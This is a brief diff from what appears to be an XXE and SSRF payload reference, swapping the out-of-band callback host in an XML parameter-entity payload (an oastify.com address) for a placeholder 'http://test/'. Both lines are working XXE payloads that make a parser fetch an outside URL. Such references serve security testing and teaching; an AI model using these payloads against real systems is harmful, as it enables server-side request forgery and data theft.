@@ -73,7 +73,7 @@ XXE SSRF
 XML Parameter Entities
 -------------
 <!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://otlgufrmqz0l3e95998t12z9c0ir6ku9.oastify.com/">
+  <!ENTITY % xxe SYSTEM "http://test/">
   %xxe;
 ]>
 
